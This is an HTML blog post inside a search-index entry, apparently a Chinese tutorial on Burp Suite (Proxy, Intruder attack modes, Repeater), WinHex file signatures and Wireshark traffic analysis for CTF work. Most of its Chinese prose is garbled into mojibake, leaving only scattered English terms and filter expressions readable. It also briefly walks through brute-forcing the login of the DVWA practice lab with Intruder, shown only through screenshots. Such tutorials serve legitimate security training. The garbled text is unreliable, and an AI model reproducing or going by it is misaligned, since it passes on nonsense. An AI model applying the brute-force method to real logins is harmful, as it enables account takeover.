<p>Burp ä»£ç†å…è®¸ä½ é€šè¿‡ç›‘è§†å’Œæ“çºµåº”ç”¨ç¨‹åºä¼ è¾“çš„å…³é”®å‚æ•°å’Œå…¶ä»–æ•°æ®æ¥æŸ¥æ‰¾å’Œæ¢ç´¢åº”ç”¨ç¨‹åºçš„æ¼æ´ã€‚é€šè¿‡ä»¥æ¶æ„çš„æ–¹å¼ä¿®æ”¹æµè§ˆå™¨çš„è¯·æ±‚ï¼ŒBurp ä»£ç†å¯ä»¥ç”¨æ¥è¿›è¡Œæ”»å‡»ï¼Œå¦‚ï¼šSQL æ³¨å…¥ï¼Œcookie æ¬ºéª—ï¼Œæå‡æƒé™ï¼Œä¼šè¯åŠ«æŒï¼Œç›®å½•éå†ï¼Œç¼“å†²åŒºæº¢å‡ºã€‚æ‹¦æˆªçš„ä¼ è¾“å¯ä»¥è¢«ä¿®æ”¹æˆåŸå§‹æ–‡æœ¬ï¼Œä¹Ÿå¯ä»¥æ˜¯åŒ…å«å‚æ•°æˆ–è€…æ¶ˆæ¯å¤´çš„è¡¨æ ¼ï¼Œä¹Ÿå¯ä»¥åå…­è¿›åˆ¶å½¢å¼ï¼Œç”šè‡³å¯ä»¥æ“çºµäºŒè¿›åˆ¶å½¢å¼çš„æ•°æ®ã€‚åœ¨ Burp ä»£ç†å¯ä»¥å‘ˆç°å‡ºåŒ…å« HTML æˆ–è€…å›¾åƒæ•°æ®çš„å“åº”æ¶ˆæ¯ã€‚</p>
<h3 id="intercept">intercept</h3>
<ul>
<li>
<p>interceptï¼šç”¨äºæ˜¾ç¤ºå’Œä¿®æ”¹Httpè¯·æ±‚å’Œç›¸åº”ï¼Œé€šè¿‡ä½ çš„æµè§ˆå™¨å’ŒwebæœåŠ¡å™¨ä¹‹é—´æ‹¦æˆªæµé‡å®ç°åŠŸèƒ½ï¼Œåœ¨Proxyçš„é€‰é¡¹ä¸­ï¼Œå¯ä»¥é…ç½®æ‹¦æˆªè§„åˆ™æ¥ç¡®å®šæ˜¯ä»€ä¹ˆè¯·æ±‚å’Œç›¸åº”è¢«æ‹¦æˆªï¼ˆä¾‹å¦‚ï¼ŒèŒƒå›´å†…çš„é¡¹ç›®ï¼Œç‰¹å®šæ–‡ä»¶æ‰©å±•åã€é¡¹ç›®è¦æ±‚ä¸å‚æ•°ï¼‰</p>
</li>
<li>
<p>forwordï¼šå°†è¯·æ±‚åŒ…å‘å‡º</p>
</li>
<li>
<p>dropï¼šä¸¢æ‰è¯·æ±‚åŒ…</p>
</li>
<li>
<p>intercept is on/offï¼šæˆªæ–­çš„å¼€å…³</p>
</li>
<li>
<p>Actionï¼šå¯¹è¯·æ±‚åŒ…çš„ä¸€äº›æ“ä½œï¼Œæˆ‘ä»¬å¯¹åŒ…ä½“çš„ä»»ä½•ä¿®æ”¹éƒ½å¯ä»¥åœ¨è¿™ä¸ªçª—å£å†…è¿›è¡Œç›´æ¥ä¿®æ”¹ï¼Œç„¶åå‘é€</p>
</li>
<li>
<p>Rawï¼šå¸¸è§„æ•°æ®åŒ…æ¨¡å¼</p>
</li>
<li>
<p>headerï¼šè¯·æ±‚å¤´</p>
</li>
<li>
<p>Hexï¼šåå…­è¿›åˆ¶æ•°æ®</p>
</li>
</ul>
<h3 id="http-history">http history</h3>
<p>æ¨¡å—é‡Œé¢æ˜¯æˆ‘ä»¬æ‰“å¼€burpsuiteä»£ç†ä»¥æ¥æ‰€æœ‰çš„httpè¯·æ±‚ï¼Œæˆ‘ä»¬æœ‰æ—¶å€™éªŒè¯æ¼æ´æˆåŠŸäº†ä½†æ˜¯å¤ç°ä¸æˆåŠŸè¿™ç§åœºæ™¯éƒ½å¯ä»¥åœ¨è¿™é‡Œé¢è¿›è¡Œè¯·æ±‚çš„å›çœ‹ã€‚</p>
<h3 id="option">option</h3>
<p>åœ¨optionsé€‰é¡¹æˆ‘ä»¬å¯ä»¥è®¾ç½®è¯·æ±‚çš„ç›‘å¬å’Œæ‹¦æˆªæˆªæ–­å®¢æˆ·æ®µçš„è¯·æ±‚å’ŒæœåŠ¡ç«¯çš„è¿”å›ä»¥åŠwebsocket è¯·æ±‚çš„æˆªæ–­ã€‚åœ¨æ­¤å¤„æˆ‘ä»¬å¯ä»¥ä¿®æ”¹æˆ‘ä»¬ç›‘å¬çš„ipå’Œç«¯å£ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬burpsuiteçš„è¯·æ±‚åŒ…æˆªå–ä¸åˆ°å¯èƒ½å°±æ˜¯å› ä¸ºæ­¤å¤„æœ‰é—®é¢˜ï¼Œç«¯å£å†²çªç­‰ç­‰</p>
<h2 id="Intrude">Intrude</h2>
<ul>
<li>
<p>attack typeï¼šæ”»å‡»æ¨¡å¼è®¾ç½®</p>
</li>
<li>
<p>sniperï¼šå¯¹å˜é‡ä¾æ¬¡è¿›è¡Œç ´è§£ã€‚å¤šä¸ªæ ‡è®°ä¾æ¬¡è¿›è¡Œã€‚</p>
</li>
<li>
<p>battering ramï¼šå¯¹å˜é‡åŒæ—¶è¿›è¡Œç ´è§£ã€‚å¤šä¸ªæ ‡è®°åŒæ—¶è¿›è¡Œã€‚</p>
</li>
<li>
<p>pitchforkï¼šæ¯ä¸€ä¸ªå˜é‡æ ‡è®°å¯¹åº”ä¸€ä¸ªå­—å…¸ï¼Œå–æ¯ä¸ªå­—å…¸çš„å¯¹åº”é¡¹ã€‚</p>
</li>
<li>
<p>cluster bombï¼šå¯¹æ¯ä¸ªå˜é‡å¯¹åº”ä¸€ä¸ªå­—å…¸ï¼Œå¹¶ä¸”è¿›è¡Œäº¤é›†ï¼Œå¹¶ä¸”è¿›è¡Œäº¤å‰çˆ†ç ´ï¼Œå°è¯•å„ç§ç»„åˆã€‚</p>
</li>
</ul>
<p><strong>Payloadï¼š</strong></p>
<ul>
<li>
<p>Payload Sets Payloadæ•°é‡ç±»å‹è®¾ç½®</p>
</li>
<li>
<p>Payload Opetions[Simple list]  è¯¥é€‰é¡¹ä¼šæ ¹æ®é€‰é¡¹1ä¸­Payload typeçš„è®¾ç½®è€Œæ”¹å˜</p>
</li>
<li>
<p>Payload Processing å¯¹ç”Ÿæˆçš„Payloadè¿›è¡Œç¼–ç ã€åŠ å¯†ã€æˆªå–ç­‰æ“ä½œ</p>
</li>
<li>
<p>Payload Encoding ä½ å¯ä»¥é…ç½®å“ªäº›æœ‰æ•ˆè½½è·ä¸­çš„å­—ç¬¦åº”è¯¥æ˜¯URLç¼–ç çš„HTTPè¯·æ±‚ä¸­çš„å®‰å…¨ä¼ è¾“ã€‚ä»»ä½•å·²é…ç½®çš„URLç¼–ç æœ€ååº”ç”¨ï¼Œä»»ä½•æœ‰æ•ˆè½½è·å¤„ç†è§„åˆ™æ‰§è¡Œä¹‹åã€‚</p>
</li>
</ul>
<h2 id="Repeater">Repeater</h2>
<p>é‡æ”¾æ•°æ®åŒ…ã€‚</p>
<p>ä¸€èˆ¬ä¿®æ”¹å‚æ•°ï¼Œç„¶åé‡æ”¾æ•°æ®åŒ…ï¼ŒæŸ¥çœ‹è¿”å›ç»“æœã€‚</p>
<h2 id="æŠ“åŒ…ç¤ºä¾‹">æŠ“åŒ…ç¤ºä¾‹</h2>
<blockquote>
<p>DVWA-brute force-low</p>
</blockquote>
<ul>
<li><code>Intercept On</code></li>
<li>foxy proxyé€‰æ‹©å¯¹åº”æ¨¡å¼</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202233318301.png" class="" title="image-20241202233318301">
<p>å³å‡»ï¼Œè½¬åˆ° intrude æ¿å—ï¼Œè®¾ç½®è´¦å·ã€å¯†ç ä¸ºæŒ‡å®šå¯¹è±¡ï¼šï¼ˆè¿™é‡ŒCluster bomb æ˜¯ æ‰«æ1å­—å…¸*2å­—å…¸ æ¬¡æ•°ï¼Œä¹Ÿå°±æ˜¯username å’Œ password çš„æ‰«æå®Œå…¨ç‹¬ç«‹ã€‚ï¼‰</p>
<p>åˆ†åˆ«è®¾ç½®å­—å…¸ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202233723759.png" class="" title="image-20241202233723759">
<p>è¿›è¡Œæš´åŠ›ç ´è§£ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202233916212.png" class="" title="image-20241202233916212">
<p>ç™»å½•æˆåŠŸçš„æ˜¾ç¤ºã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202234020235.png" class="" title="image-20241202234020235">
<p>ä¹Ÿèƒ½ç›´æ¥æŠ“åŒ…é‡æ”¾ã€‚</p>
<img src="/2024/12/02/web-commontools-install/image-20241202234221305.png" class="" title="image-20241202234221305">
<h1>WinhexæŸ¥çœ‹æ–‡ä»¶</h1>
<table>
<thead>
<tr>
<th>å¸¸è§æ–‡ä»¶</th>
<th>16è¿›åˆ¶æ ¼å¼</th>
<th>ASCIIå­—ç¬¦</th>
</tr>
</thead>
<tbody>
<tr>
<td>JPG</td>
<td>æ–‡ä»¶å¤´ï¼šFFD8ï¼›æ–‡ä»¶å°¾ï¼šFFD9</td>
<td>jpg</td>
</tr>
<tr>
<td>PNG</td>
<td>æ–‡ä»¶å¤´ï¼š89504E47ï¼›æ–‡ä»¶å°¾ï¼šAE426082</td>
<td>png</td>
</tr>
<tr>
<td>ZIP/DOCX/XLS</td>
<td>æ–‡ä»¶å¤´ï¼š504B0304</td>
<td>pk</td>
</tr>
<tr>
<td>â€¦â€¦</td>
<td>â€¦â€¦</td>
<td>â€¦â€¦</td>
</tr>
</tbody>
</table>
<ul>
<li>ä¸¤ä¸ªä¸»ç•Œé¢
<ul>
<li>å·¦ï¼šæ–‡ä»¶16è¿›åˆ¶æ ¼å¼</li>
<li>å³ï¼š16è¿›åˆ¶è½¬æ¢æˆASCIIå­—ç¬¦</li>
</ul>
</li>
<li>æœç´¢å»å®šä½æ•°æ®
<ul>
<li>16è¿›åˆ¶æ•°å€¼ï¼šå¾€å¾€æå–å¯èƒ½å­˜åœ¨çš„è¿½åŠ æ–‡ä»¶</li>
<li>å­—ç¬¦ä¸²ï¼šå­˜åœ¨<code>flag&#123;</code>æˆ–è€…ä¸€äº›å…³é”®å­—è½¬ç ï¼ˆç¼–ç ï¼‰</li>
</ul>
</li>
</ul>
<h1>æµé‡åˆ†ææµç¨‹</h1>
<h2 id="ä¸‰ä¸ªç•Œé¢">ä¸‰ä¸ªç•Œé¢</h2>
<ul>
<li>
<p>åˆ†ç»„åˆ—è¡¨ï¼šç€è‰²åŒºåŸŸï¼Œæä¾›å…³é”®æ•°æ®æ˜¾ç¤ºï¼Œipè·ŸInfoâ€¦â€¦</p>
</li>
<li>
<p>åˆ†ç»„è¯¦æƒ…ï¼šåŸºäºåè®®è¿›è¡ŒæŠ¥æ–‡æ‹†åˆ†ï¼ŒæŒ‰ç…§ä»åº•å±‚åˆ°é¡¶å±‚ï¼ˆç›¸å¯¹æ¥è¯´ï¼Œæ›´å…³æ³¨é è¿‘é¡¶å±‚çš„åè®®ï¼ŒTCP/UDPåŠä»¥ä¸Šçš„åè®®ï¼‰</p>
</li>
<li>
<p>åˆ†ç»„å­—èŠ‚æµï¼šæ•°æ®åŒ…çš„åŸå§‹æ•°æ®ï¼ˆæ•°æ®é‡æœ€å…¨ï¼‰ï¼Œä½œä¸º<strong>æŸ¥æ‰¾åŒºåŸŸ</strong></p>
</li>
</ul>
<h2 id="æ€»ä½“åˆ†æ"><strong>æ€»ä½“åˆ†æ</strong></h2>
<ul>
<li>åè®®åˆ†çº§ï¼šç­›é€‰å‡ºå…³é”®åè®®
<ul>
<li>å‘ç°æµé‡åŒ…ä¸­éƒ½æ˜¯<strong>å¸¸è§åè®®</strong>ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨ç›¸å¯¹é ä¸Šå±‚<strong>å æ¯”ç›¸å¯¹æ›´å¤š</strong>çš„åè®®ã€‚</li>
<li>å‘ç°æµé‡åŒ…ä¸­å­˜åœ¨<strong>ä¸å¸¸è§åè®®</strong>ï¼Œå»å…³æ³¨<strong>å æ¯”ç›¸å¯¹æ›´å°‘</strong>çš„åè®®ã€‚</li>
</ul>
</li>
<li>ä¼šè¯ï¼šç­›é€‰å‡ºå…³é”®ä¼šè¯ã€‚
<ul>
<li>é€šè¿‡<strong>åˆ†ç»„æ’åº</strong>ï¼ŒæŠŠå…³é”®ä¼šè¯ç­›é€‰å‡ºæ¥ã€‚</li>
<li>ç›¸å¯¹æ¥è¯´çœ‹åˆ†ç»„æ•°é‡æ›´å¤š/æ›´å°‘çš„ä¼šè¯</li>
</ul>
</li>
<li>ç«¯ç‚¹ï¼ˆ<strong>ç½‘ç»œæ”»å‡»è¡Œä¸º</strong>ä¸­ç›¸å¯¹è¾ƒå¤šï¼‰ï¼šç­›é€‰å‡ºæŸä¸ªå…³é”®IPï¼Œ<strong>è§’è‰²</strong>åŒºåˆ†ï¼šæœåŠ¡å™¨è§’è‰²ã€æ™®é€šç”¨æˆ·ã€æ”»å‡»è€…
<ul>
<li>æ•°æ®é‡æœ€å¤šï¼šæœåŠ¡å™¨</li>
<li>æ•°æ®é‡ç›¸å¯¹è¾ƒå¤šï¼šæ”»å‡»è€…</li>
<li>æ•°æ®é‡è¾ƒå°‘ï¼šæ­£å¸¸ç”¨æˆ·</li>
</ul>
</li>
</ul>
<h2 id="è¯¦ç»†åˆ†æ"><strong>è¯¦ç»†åˆ†æ</strong></h2>
<ul>
<li>
<p>åŸºäº<strong>å·²çŸ¥æµé‡</strong>è¿›è¡Œè¿‡æ»¤ï¼Œåœ¨æ€»ä½“åˆ†æçš„åŸºç¡€ä¹‹ä¸Šè¿›è¡ŒæŸ¥çœ‹</p>
</li>
<li>
<p>åŸºäº<strong>åˆ†æä¿¡æ¯</strong>è¿›è¡Œè¿‡æ»¤ï¼Œæ ¹æ®<strong>è¿‡æ»¤è¯­å¥</strong>è¿›è¡Œè¿‡æ»¤</p>
<ul>
<li>
<p>åŸºäºåè®®ï¼šftp/http</p>
</li>
<li>
<p>åŸºäºipï¼šip.addr/src/dst == xxx</p>
</li>
<li>
<p>é€šè¿‡æŠ¥æ–‡ç±»å‹è¿›è¡Œç­›é€‰ï¼š<code>http.request.method == GET/POST</code>/<code>http.response.code == 200/404/302</code></p>
<ul>
<li>ç™»å½•åœºæ™¯ï¼š302</li>
</ul>
</li>
</ul>
</li>
<li>
<p>è¿½è¸ªæµ</p>
<ul>
<li>ç‰ˆæœ¬è¾ƒè€çš„wiresharkï¼Œç›´æ¥æ¨èTCPè¿½è¸ªæµ</li>
<li>ç‰ˆæœ¬æ–°çš„wiresharkï¼Œä¼˜å…ˆTCPï¼Œä½†HTTPä¸€èˆ¬ä¹Ÿèƒ½è¾¾æˆç›®çš„</li>
<li>HTTPåœ¨TCPåŸºç¡€ä¹‹ä¸Šï¼Œå»é™¤äº†éƒ¨åˆ†ä¿¡æ¯ã€‚å¯¹éœ€è¦æå–çš„æ•°æ®ä¸å¤ªæ˜ç¡®çš„æƒ…å†µä¸‹ï¼Œæ¨èHTTPè¿½è¸ªæµï¼›ç›¸å¯¹æ˜ç¡®æ–‡ä»¶æ•°æ®ï¼Œæ¨èæ›´å…¨çš„TCPè¿½è¸ªæµã€‚</li>
</ul>
</li>
</ul>
<h2 id="æ•°æ®æå–"><strong>æ•°æ®æå–</strong></h2>
<ul>
<li>
<p>å­—ç¬¦ä¸²æå–</p>
</li>
<li>
<p>æ–‡ä»¶æå–</p>
</li>
<li>
<p>è¿½è¸ªæµåˆ†æå‡ºæ¥çš„ä¿¡æ¯è¿›è¡Œæå–</p>
</li>
<li>
<p>å¯¼å‡ºå¯¹è±¡ï¼šHTTP/FTP</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>Environment</tag>
        <tag>Web</tag>
      </tags>
  </entry>
</search>
